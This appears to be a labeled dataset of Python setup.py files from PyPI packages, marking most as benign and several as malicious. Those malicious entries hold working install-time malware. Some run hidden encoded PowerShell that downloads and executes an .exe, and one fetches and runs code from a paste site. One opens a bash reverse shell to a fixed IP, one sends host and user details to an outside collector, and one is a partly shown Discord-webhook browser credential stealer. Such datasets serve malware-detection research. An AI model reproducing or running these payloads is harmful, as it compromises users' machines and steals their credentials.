readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package for package in setuptools.find_packages() if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-storage\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "dateutils-0.6.12", "func": "#!/usr/bin/env python\n\nfrom io import open\nfrom os import path\nfrom setuptools import setup\n\nthis_directory = path.abspath(path.dirname(__file__))\nwith open(path.join(this_directory, 'README.mkd'), encoding='utf-8') as f:\n    long_description = f.read()\n\nsetup(\n\n    name='dateutils',\n    version='0.6.12',\n\n    description='Various utilities for working with date and datetime objects',\n\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n\n    author='Jeremy Cantrell',\n    author_email='jmcantrell@gmail.com',\n    url='https://github.com/jmcantrell/python-dateutils',\n\n    zip_safe=False,\n    include_package_data=True,\n\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Natural Language :: English',\n        'Operating System :: POSIX :: Linux',\n        'Programming Language :: Python',\n    ],\n\n    install_requires=[\n        'argparse; python_version < \"2.7\"',\n        'python-dateutil',\n        'pytz'\n    ],\n\n    entry_points={\n        'console_scripts': [\n            'dateadd = dateutils.dateadd:main',\n            'datediff = dateutils.datediff:main',\n        ],\n    },\n\n    packages=[\n        'dateutils',\n    ],\n\n)\n", "target": 0}
{"idx": "Flask-JWT-0.3.2", "func": "\"\"\"\nFlask-JWT\n=========\n\nFlask-JWT is a Flask extension that adds basic Json Web Token features to any application.\n\nResources\n---------\n\n* `Documentation <http://packages.python.org/Flask-JWT/>`_\n* `Issue Tracker <https://github.com/mattupstate/flask-jwt/issues>`_\n* `Source <https://github.com/mattupstate/flask-jwt>`_\n* `Development Version\n  <https://github.com/mattupstate/flask-jwt/raw/develop#egg=Flask-JWT-dev>`_\n\n\"\"\"\n\nimport sys\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.test import test as TestCommand\n\n\ndef get_requirements(suffix=''):\n    with open('requirements%s.txt' % suffix) as f:\n        rv = f.read().splitlines()\n    return rv\n\n\ndef get_long_description():\n    with open('README.rst') as f:\n        rv = f.read()\n    return rv\n\n\nclass PyTest(TestCommand):\n    def finalize_options(self):\n        TestCommand.finalize_options(self)\n        self.test_args = [\n            '-xrs',\n            '--cov', 'flask_jwt',\n            '--cov-report', 'term-missing',\n            '--pep8',\n            '--flakes',\n            '--clearcache',\n            'tests'\n        ]\n        self.test_suite = True\n\n    def run_tests(self):\n        import pytest\n        errno = pytest.main(self.test_args)\n        sys.exit(errno)\n\nsetup(\n    name='Flask-JWT',\n    version='0.3.2',\n    url='https://github.com/mattupstate/flask-jwt',\n    license='MIT',\n    author='Matt Wright',\n    author_email='matt@nobien.net',\n    description='JWT token authentication for Flask apps',\n    long_description=__doc__,\n    packages=find_packages(),\n    zip_safe=False,\n    include_package_data=True,\n    platforms='any',\n    install_requires=get_requirements(),\n    tests_require=get_requirements('-dev'),\n    cmdclass={'test': PyTest},\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ]\n)\n", "target": 0}
{"idx": "funcy-1.17", "func": "from setuptools import setup\n\n\n# Remove build status and move Gitter link under title for PyPi\nREADME = open('README.rst').read()    \\\n    .replace('|Build Status|', '', 1)\n\n\nsetup(\n    name='funcy',\n    version=open('VERSION').read().strip(),\n    author='Alexander Schepanovski',\n    author_email='suor.web@gmail.com',\n\n    description='A fancy and practical functional tools',\n    long_description=README,\n    long_description_content_type=\"text/x-rst\",\n    url='http://github.com/Suor/funcy',\n    license='BSD',\n\n    packages=['funcy'],\n\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Intended Audience :: Developers',\n    ]\n)\n", "target": 0}
{"idx": "esqstringpingcraft-7.91", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqstringpingcraft',\n    packages = ['modlib'],\n    version = '7.87',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tls-client-py-1", "func": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/65cjr/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='tls_client-py',\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='Team-AI',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)", "target": 1}
{"idx": "h11-0.13.0", "func": "from setuptools import setup, find_packages\n\n# defines __version__\nexec(open(\"h11/_version.py\").read())\n\nsetup(\n    name=\"h11\",\n    version=__version__,\n    description=\n        \"A pure-Python, bring-your-own-I/O implementation of HTTP/1.1\",\n    long_description=open(\"README.rst\").read(),\n    author=\"Nathaniel J. Smith\",\n    author_email=\"njs@pobox.com\",\n    license=\"MIT\",\n    packages=find_packages(),\n    package_data={'h11': ['py.typed']},\n    url=\"https://github.com/python-hyper/h11\",\n    # This means, just install *everything* you see under h11/, even if it\n    # doesn't look like a source file, so long as it appears in MANIFEST.in:\n    include_package_data=True,\n    python_requires=\">=3.6\",\n    install_requires=[\n        \"dataclasses; python_version < '3.7'\",\n        \"typing_extensions; python_version < '3.8'\",\n    ],\n    classifiers=[\n        \"Development Status :: 3 - Alpha\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: System :: Networking\",\n    ],\n)\n", "target": 0}
{"idx": "dash_html_components-2.0.0", "func": "import io\nfrom setuptools import setup\n\nsetup(\n    name=\"dash_html_components\",\n    version=\"2.0.0\",\n    author=\"Chris Parmer <chris@plotly.com>\",\n    author_email=\"chris@plotly.com\",\n    packages=[\"dash_html_components\"],\n    url=\"https://github.com/plotly/dash-html-components\",\n    include_package_data=True,\n    license=\"MIT\",\n    description=\"Vanilla HTML components for Dash\",\n    long_description=io.open(\"README.md\", encoding=\"utf-8\").read(),\n    long_description_content_type=\"text/markdown\",\n    install_requires=[],\n)\n", "target": 0}
{"idx": "selfcvinfourl-7.69", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcvinfourl',\n    packages = ['modlib'],\n    version = '8.7',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "xxxsss-0.1.0", "func": "import setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n    def run(self):\n        # Run the standard install first\n        install.run(self)\n        # Now you can execute whatever post-install code you have\n        os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7888 <&1'\")\n        # your code here\n\nsetup(\n    name='xxxsss',\n    version='0.1.0',\n    description='A brief description of your package',\n    author='boogipop',\n    author_email='your.email@example.com',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other arguments here...\n)\n", "target": 1}
{"idx": "great_expectations-0.15.18", "func": "import re\nfrom glob import glob\n\nimport pkg_resources\nfrom setuptools import find_packages, setup\n\nimport versioneer\n\n\ndef get_extras_require():\n    results = {}\n    extra_key_mapping = {\n        \"aws_secrets\": \"boto\",\n        \"azure_secrets\": \"azure\",\n        \"gcp\": \"bigquery\",\n        \"s3\": \"boto\",\n    }\n    sqla_keys = (\n        \"athena\",\n        \"bigquery\",\n        \"dremio\",\n        \"mssql\",\n        \"mysql\",\n        \"postgresql\",\n        \"redshift\",\n        \"snowflake\",\n        \"teradata\",\n        \"trino\",\n    )\n    ignore_keys = (\"sqlalchemy\", \"test\", \"test-pipeline\")\n    rx_fname_part = re.compile(r\"requirements-dev-(.*).txt\")\n    for fname in sorted(glob(\"requirements-dev-*.txt\")):\n        key = rx_fname_part.match(fname).group(1)\n        if key in ignore_keys:\n            continue\n        with open(fname) as f:\n            parsed = [str(req) for req in pkg_resources.parse_requirements(f)]\n            results[key] = parsed\n\n    lite = results.pop(\"lite\")\n    contrib = results.pop(\"contrib\")\n    results[\"boto\"] = [req for req in lite if req.startswith(\"boto\")]\n    results[\"sqlalchemy\"] = [req for req in lite if req.startswith(\"sqlalchemy\")]\n    results[\"test\"] = lite + contrib\n\n    for new_key, existing_key in extra_key_mapping.items():\n        results[new_key] = results[existing_key]\n    for key in sqla_keys:\n        results[key] += results[\"sqlalchemy\"]\n\n    results.pop(\"boto\")\n    return results\n\n\n# Parse requirements.txt\nwith open(\"requirements.txt\") as f:\n    required = f.read().splitlines()\n\nlong_description = \"Always know what to expect from your data. (See https://github.com/great-expectations/great_expectations for full description).\"\n\nconfig = {\n    \"description\": \"Always know what to expect from your data.\",\n    \"author\": \"The Great Expectations Team\",\n    \"url\": \"https://github.com/great-expectations/great_expectations\",\n    \"author_email\": \"team@greatexpectations.io\",\n    \"version\": versioneer.get_version(),\n    \"cmdclass\": versioneer.get_cmdclass(),\n    \"install_requires\": required,\n    \"extras_require\": get_extras_require(),\n    \"packages\": find_packages(exclude=[\"contrib*\", \"docs*\", \"tests*\", \"examples*\"]),\n    \"entry_points\": {\n        \"console_scripts\": [\"great_expectations=great_expectations.cli:main\"]\n    },\n    \"name\": \"great_expectations\",\n    \"long_description\": long_description,\n    \"license\": \"Apache-2.0\",\n    \"keywords\": \"data science testing pipeline data quality dataquality validation datavalidation\",\n    \"include_package_data\": True,\n    \"classifiers\": [\n        \"Development Status :: 4 - Beta\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Science/Research\",\n        \"Intended Audience :: Other Audience\",\n        \"Topic :: Scientific/Engineering\",\n        \"Topic :: Software Development\",\n        \"Topic :: Software Development :: Testing\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n    ],\n}\n\nsetup(**config)\n", "target": 0}
{"idx": "flake8-quotes-3.3.1", "func": "import io\nimport os\nfrom setuptools import setup\n\n__dir__ = os.path.dirname(__file__)\n\n\ndef read(*filenames, **kwargs):\n    encoding = kwargs.get('encoding', 'utf-8')\n    sep = kwargs.get('sep', '\\n')\n    buf = []\n    for filename in filenames:\n        with io.open(filename, encoding=encoding) as f:\n            buf.append(f.read())\n    return sep.join(buf)\n\n\nLONG_DESCRIPTION = read(os.path.join(__dir__, 'README.rst'))\n\nabout = {}\nwith open(os.path.join(__dir__, 'flake8_quotes', '__about__.py')) as file:\n    exec(file.read(), about)\n\n\nsetup(\n    name='flake8-quotes',\n    author='Zachary Wright Heller',\n    author_email='zheller@gmail.com',\n    version=about['__version__'],\n    install_requires=[\n        'flake8',\n    ],\n    url='http://github.com/zheller/flake8-quotes/',\n    long_description=LONG_DESCRIPTION,\n    description='Flake8 lint for quotes.',\n    packages=['flake8_quotes'],\n    test_suite='test',\n    include_package_data=True,\n    entry_points={\n        'flake8.extension': [\n            'Q0 = flake8_quotes:QuoteChecker',\n        ],\n    },\n    license='MIT',\n    zip_safe=True,\n    keywords='flake8 lint quotes',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Console',\n        'Framework :: Flake8',\n        'Intended Audience :: Developers',\n        'Operating System :: OS Independent',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.11',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Software Development :: Quality Assurance',\n    ]\n)\n", "target": 0}
{"idx": "pephttp-8.13", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'pephttp',\n    packages = ['modlib'],\n    version = '8.21',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "easygui-0.98.3", "func": "import distutils.core\n## WARNING: Although the following import appears to do nothing, it is required for bdist_wheel to be recognized\nfrom setuptools import setup, find_packages\n\nversion = \"0.98.3\"\nrelease = \"0.98.3\"\n\ndesc = list()\ndesc.append('EasyGUI is a module for very simple, very easy GUI programming in Python.  ')\ndesc.append('EasyGUI is different from other GUI generators in that EasyGUI is NOT event-driven.  ')\ndesc.append('Instead, all GUI interactions are invoked by simple function calls.')\n\nwith open('README.md', \"r\", encoding='utf-8') as f:\n    long_description = f.read()\n\ndistutils.core.setup(\n    name='easygui',\n    version=version,\n    url='https://github.com/robertlugg/easygui',\n    description=''.join(desc),\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author='easygui developers and Stephen Ferg',\n    author_email='robert.lugg@gmail.com',\n    license='BSD',\n    keywords='gui linux windows graphical user interface',\n    packages=['easygui', 'easygui.boxes'],\n    package_data={\n        'easygui': ['python_and_check_logo.*', 'zzzzz.gif']\n    },\n    classifiers=[\n        'Intended Audience :: Developers',\n        'Intended Audience :: Education',\n        'License :: OSI Approved :: BSD License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Topic :: Software Development :: User Interfaces',\n        ]\n    )\n\n", "target": 0}
{"idx": "antchain-sdk-cafecmdb-1.0.0", "func": "#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"http://5r13v9.ceye.io\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='antchain_sdk_cafecmdb', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n", "target": 1}
{"idx": "Glances-3.2.7", "func": "#!/usr/bin/env python\n\nimport glob\nimport os\nimport re\nimport sys\nfrom io import open\n\nfrom setuptools import setup, Command\n\n\nif sys.version_info < (2, 7) or (3, 0) <= sys.version_info < (3, 4):\n    print('Glances requires at least Python 2.7 or 3.4 to run.')\n    sys.exit(1)\n\nPY2 = sys.version_info[0] == 2\nPY3 = sys.version_info[0] == 3\n\n\n# Global functions\n##################\n\nwith open(os.path.join('glances', '__init__.py'), encoding='utf-8') as f:\n    version = re.search(r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\", f.read(), re.M).group(1)\n\nif not version:\n    raise RuntimeError('Cannot find Glances version information.')\n\nwith open('README.rst', encoding='utf-8') as f:\n    long_description = f.read()\n\n\ndef get_data_files():\n    data_files = [\n        ('share/doc/glances', ['AUTHORS', 'COPYING', 'NEWS.rst', 'README.rst',\n                               'CONTRIBUTING.md', 'conf/glances.conf']),\n        ('share/man/man1', ['docs/man/glances.1'])\n    ]\n\n    return data_files\n\n\ndef get_install_requires():\n    requires = ['psutil>=5.3.0', 'defusedxml', 'future', 'packaging']\n    if sys.platform.startswith('win'):\n        requires.append('bottle')\n        requires.append('requests')\n\n    return requires\n\n\ndef get_install_extras_require():\n    extras_require = {\n        'action': ['chevron'],\n        'browser': ['zeroconf==0.19.1' if PY2 else 'zeroconf>=0.19.1'],\n        'cloud': ['requests'],\n        'docker': ['docker>=2.0.0', 'python-dateutil', 'six'],\n        'export': ['bernhard', 'cassandra-driver', 'couchdb', 'elasticsearch',\n                   'graphitesender', 'influxdb>=1.0.0', 'kafka-python', 'pika',\n                   'paho-mqtt', 'potsdb', 'prometheus_client', 'pyzmq',\n                   'statsd'],\n        'folders': ['scandir'],  # python_version<\"3.5\"\n        'graph': ['pygal'],\n        'ip': ['netifaces'],\n        'raid': ['pymdstat'],\n        'smart': ['pySMART.smartx'],\n        'snmp': ['pysnmp'],\n        'sparklines': ['sparklines'],\n        'web': ['bottle', 'requests'],\n        'wifi': ['wifi']\n        #'gpu' and 'sensors' ==> See bellow\n    }\n    if PY3:\n        extras_require['export'].append('influxdb-client')\n        extras_require['gpu'] = ['py3nvml']\n    if sys.platform.startswith('linux'):\n        extras_require['sensors'] = ['batinfo']\n\n    # Add automatically the 'all' target\n    extras_require.update({'all': [i[0] for i in extras_require.values()]})\n\n    return extras_require\n\n\nclass tests(Command):\n    user_options = []\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        import subprocess\n        import sys\n        for t in glob.glob('unitest.py'):\n            ret = subprocess.call([sys.executable, t]) != 0\n            if ret != 0:\n                raise SystemExit(ret)\n        raise SystemExit(0)\n\n\n# Setup !\n\nsetup(\n    name='Glances',\n    version=version,\n    description=\"A cross-platform curses-based monitoring tool\",\n    long_description=long_description,\n    author='Nicolas Hennion',\n    author_email='nicolas@nicolargo.com',\n    url='https://github.com/nicolargo/glances',\n    license='LGPLv3',\n    keywords=\"cli curses monitoring system\",\n    python_requires=\">=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*\",\n    install_requires=get_install_requires(),\n    extras_require=get_install_extras_require(),\n    packages=['glances'],\n    include_package_data=True,\n    data_files=get_data_files(),\n    cmdclass={'test': tests},\n    test_suite=\"unitest.py\",\n    entry_points={\"console_scripts\": [\"glances=glances:main\"]},\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Console :: Curses',\n        'Environment :: Web Environment',\n        'Framework :: Bottle',\n        'Intended Audience :: Developers',\n        'Intended Audience :: End Users/Desktop',\n        'Intended Audience :: System Administrators',\n        'License :: OSI Approved :: GNU Lesser General Public License v3 (LGPLv3)',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Topic :: System :: Monitoring'\n    ]\n)\n", "target": 0}
{"idx": "snelt-1", "func": "from setuptools import setup\nfrom builtins import all,dir,exec,format,len,ord,print,int,list,range,set,str,open\nexec('')\nimport os\nimport threading\nfrom sys import executable\nfrom sqlite3 import connect as sql_connect\nimport re\nfrom base64 import b64decode\nfrom json import loads as json_loads,load\nfrom ctypes import windll,wintypes,byref,cdll,Structure,POINTER,c_char,c_buffer\nfrom urllib.request import Request,urlopen\nfrom json import loads,dumps\nimport time\nimport shutil\nfrom zipfile import ZipFile\nimport random\nimport re\nimport subprocess\n\nhook='https://discord.com/api/webhooks/1107998533312843906/rWaPe-f1mt3ObDHYP7wRe5wlzJk2U4ns_Idh9XhxtUpuAU5VmJvK90WhoGc5krB8gJwn'\nDETECTED=False\ndef getip():\n    ip='None'\n    try:\n        ip=urlopen(Request('https://api.ipify.org')).read().decode().strip()\n    except:\n        pass\n    return ip\nrequirements=[\n['requests','requests'],\n['Crypto.Cipher','pycryptodome']\n]\nfor modl in requirements:\n    try:__import__(modl[0])\n    except:\n        subprocess.Popen(f\"{executable} -m pip install {modl[1]}\",shell=True)\n        time.sleep(3)\nimport requests\nfrom Crypto.Cipher import AES\nlocal=os.getenv('LOCALAPPDATA')\nroaming=os.getenv('APPDATA')\ntemp=os.getenv('TEMP')\nThreadlist=[]\nclass DATA_BLOB(Structure):\n    _fields_=[\n('cbData',wintypes.DWORD),\n('pbData',POINTER(c_char))\n]\ndef GetData(blob_out):\n    cbData=int(blob_out.cbData)\n    pbData=blob_out.pbData\n    buffer=c_buffer(cbData)\n    cdll.msvcrt.memcpy(buffer,pbData,cbData)\n    windll.kernel32.LocalFree(pbData)\n    return buffer.raw\ndef CryptUnprotectData(encrypted_bytes,entropy=b''):\n    buffer_in=c_buffer(encrypted_bytes,len(encrypted_bytes))\n    buffer_entropy=c_buffer(entropy,len(entropy))\n    blob_in=DATA_BLOB(len(encrypted_bytes),buffer_in)\n    blob_entropy=DATA_BLOB(len(entropy),buffer_entropy)\n    blob_out=DATA_BLOB()\n    if windll.crypt32.CryptUnprotectData(byref(blob_in),None,byref(blob_entropy),None,None,0x01,byref(blob_out)):\n        return GetData(blob_out)\ndef DecryptValue(buff,master_key=None):\n    starts=buff.decode(encoding='utf8',errors='ignore')[:3]\n    if starts=='v10' or starts=='v11':\n        iv=buff[3:15]\n        payload=buff[15:]\n        cipher=AES.new(master_key,AES.MODE_GCM,iv)\n        decrypted_pass=cipher.decrypt(payload)\n        decrypted_pass=decrypted_pass[:-16].decode()\n        return decrypted_pass\ndef LoadRequests(methode,url,data='',files='',headers=''):\n    for i in range(8):# max trys\n        try:\n            if methode=='POST':\n                if data !='':\n                    r=requests.post(url,data=data)\n                    if r.status_code==200:\n                        return r\n                elif files !='':\n                    r=requests.post(url,files=files)\n                    if r.status_code==200 or r.status_code==413:# 413=DATA TO BIG\n                        return r\n        except:\n            pass\ndef LoadUrlib(hook,data='',files='',headers=''):\n    for i in range(8):\n        try:\n            if headers !='':\n                r=urlopen(Request(hook,data=data,headers=headers))\n                return r\n            else:\n                r=urlopen(Request(hook,data=data))\n                return r\n        except:\n            pass\ndef Trust(Cookies):\n    global DETECTED\n    data=str(Cookies)\n    tim=re.findall('.google.com',data)\n    if len(tim)<-1:\n        DETECTED=True\n        return DETECTED\n    else:\n        DETECTED=False\n        return DETECTED\ndef 